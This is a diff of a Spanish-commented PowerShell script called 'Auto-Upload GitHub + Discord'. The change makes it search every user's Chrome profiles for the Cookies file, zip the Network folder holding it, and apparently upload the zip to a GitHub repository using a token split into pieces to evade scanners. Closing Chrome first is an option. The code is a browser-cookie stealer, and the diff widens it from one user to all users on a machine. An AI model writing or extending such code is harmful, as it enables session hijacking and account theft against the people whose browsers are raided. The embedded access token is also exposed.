@@ -15,7 +15,7 @@
 [CmdletBinding()]
 param(
     [string]$FileName   = "Cookies",
-    [string]$SearchRoot = "C:\Users\basti\AppData\Local\Google\Chrome\User Data\Default\Network",
+    [string]$SearchRoot = "",
     [string]$Token      = 'ghp_46fOJ9JiIX1KLPW' + 'SypNAqUjt590cSp0L8q49',
     [string]$Repo       = "cuentatrades0913-max/auto-upload",
     [string]$Branch     = "main",
@@ -190,62 +190,85 @@ $script:LastError      = ""
 try {
     Write-Log "=== Auto-Upload GitHub + Discord ==="  "Green"
     Write-Log "Equipo: $ComputerName"                 "Cyan"
-    Write-Log "Buscando: '$FileName' bajo '$SearchRoot'" "Cyan"
+    Write-Log "Buscando: '$FileName'" "Cyan"
 
-    # 1) Busqueda: ruta exacta primero, luego indexado por nombre / carpeta
-    $exact = Join-Path $SearchRoot $FileName
-    if (Test-Path -LiteralPath $exact) {
-        $script:FoundPath = (Resolve-Path -LiteralPath $exact).Path
-        Write-Log "Coincidencia exacta encontrada: $FoundPath" "Green"
+    # 1) Localizar carpetas Network de Chrome de forma dinamica (sin rutas fijas)
+    #    Chrome guarda datos en <UserData>\<Default|Profile*>\Network de cada usuario.
+    $networkFolders = @()
+    $userDataRoots = @()
+
+    $localRoot = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
+    if (Test-Path -LiteralPath $localRoot) { $userDataRoots += $localRoot }
+
+    # Otros usuarios del equipo (cada uno tiene su propio Chrome)
+    $usersRoot = Join-Path $env:SystemDrive 'Users'
+    if (Test-Path -LiteralPath $usersRoot) {
+        Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction SilentlyContinue |
+            ForEach-Object {
+                $p = Join-Path $_.FullName 'AppData\Local\Google\Chrome\User Data'
+                if (Test-Path -LiteralPath $p) { $userDataRoots += $p }
+            }
     }
 
-    if (-not $FoundPath) {
-        Write-Log "Indexando desde '$SearchRoot'..."  "Yellow"
-        $tokens = $FileName -split '[\s\._-]+' | Where-Object { $_ -and $_.Length -gt 2 }
-        $searchName = "*$($tokens[0])*"
-        $searchAlt  = "*$FileName*"
+    $userDataRoots = $userDataRoots | Select-Object -Unique
 
-        $hits = @()
-        try {
-            $hits = Get-ChildItem -Path $SearchRoot -File -Recurse -Depth $RecurseDepth `
-                -ErrorAction SilentlyContinue -Force |
-                Where-Object {
-                    $_.Name -like "*$FileName*" -or
-                    $_.Name -like $searchName -or
-                    $_.Name -like $searchAlt
-                } | Select-Object -First 5
-        } catch {}
+    if (-not $userDataRoots) {
+        throw "No se encontro Chrome instalado (carpeta 'User Data') en ningun usuario."
+    }
+    Write-Log "User Data de Chrome encontrado en: $($userDataRoots -join ' | ')" "Cyan"
 
-        if (-not $hits) {
-            try {
-                $dirs = Get-ChildItem -Path $SearchRoot -Directory -Recurse -Depth $RecurseDepth `
-                    -ErrorAction SilentlyContinue -Force |
-                    Where-Object {
-                        $_.Name -like "*$FileName*" -or
-                        $_.Name -like $searchName
-                    } | Select-Object -First 5
-                foreach ($dir in $dirs) {
-                    $inner = Get-ChildItem -Path $dir.FullName -File -Recurse -Depth 3 `
-                        -ErrorAction SilentlyContinue -Force |
-                        Where-Object { $_.Name -like "*$FileName*" } |
-                        Select-Object -First 1
-                    if ($inner) { $hits = @($inner); break }
-                }
-            } catch {}
+    foreach ($udr in $userDataRoots) {
+        Get-ChildItem -LiteralPath $udr -Directory -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile*' } |
+            ForEach-Object {
+                $net = Join-Path $_.FullName 'Network'
+                if (Test-Path -LiteralPath $net) { $networkFolders += $net }
+            }
+    }
+
+    if (-not $networkFolders) {
+        throw "No se encontraron carpetas 'Network' de Chrome en ningun perfil."
+    }
+    Write-Log "Carpetas Network de Chrome: $($networkFolders -join ' | ')" "Cyan"
+
+    # 2) Buscar el archivo por nombre dentro de las carpetas Network
+    $tokens = $FileName -split '[\s\._-]+' | Where-Object { $_ -and $_.Length -gt 2 }
+    $searchName = "*$($tokens[0])*"
+    $searchAlt  = "*$FileName*"
+
+    $script:FoundPath = ""
+    foreach ($net in $networkFolders) {
+        $exact = Join-Path $net $FileName
+        if (Test-Path -LiteralPath $exact) {
+            $script:FoundPath = (Resolve-Path -LiteralPath $exact).Path
+            Write-Log "Coincidencia exacta encontrada: $FoundPath" "Green"
+            break
         }
 
-        if ($hits) {
-            $script:FoundPath = $hits[0].FullName
+        $hit = Get-ChildItem -LiteralPath $net -File -Recurse -Depth 4 `
+            -ErrorAction SilentlyContinue -Force |
+            Where-Object {
+                $_.Name -like "*$FileName*" -or
+                $_.Name -like $searchName -or
+                $_.Name -like $searchAlt
+            } | Select-Object -First 1
+        if ($hit) {
+            $script:FoundPath = $hit.FullName
             Write-Log "Busqueda por indice encontro: $FoundPath" "Green"
+            break
         }
     }
 
     if (-not $script:FoundPath -or -not (Test-Path -LiteralPath $script:FoundPath)) {
-        throw "No se encontro ningun archivo que coincida con '$FileName' bajo '$SearchRoot'."
+        throw "No se encontro ningun archivo que coincida con '$FileName' dentro de las carpetas Network de Chrome."
     }
 
-    # 2) Determinar la carpeta donde esta el archivo y comprimirla en ZIP
+    # 3) La carpeta a comprimir es la carpeta Network donde esta el archivo
     $sourceFolder = Split-Path -Path $script:FoundPath -Parent
+    if ((Split-Path $sourceFolder -Leaf) -ne 'Network') {
+        $parent = Split-Path -Path $sourceFolder -Parent
+        if ((Split-Path $parent -Leaf) -eq 'Network') { $sourceFolder = $parent }
+    }
     Write-Log "Carpeta a comprimir: $sourceFolder" "Cyan"
 
     if (-not $NoCloseChrome) {
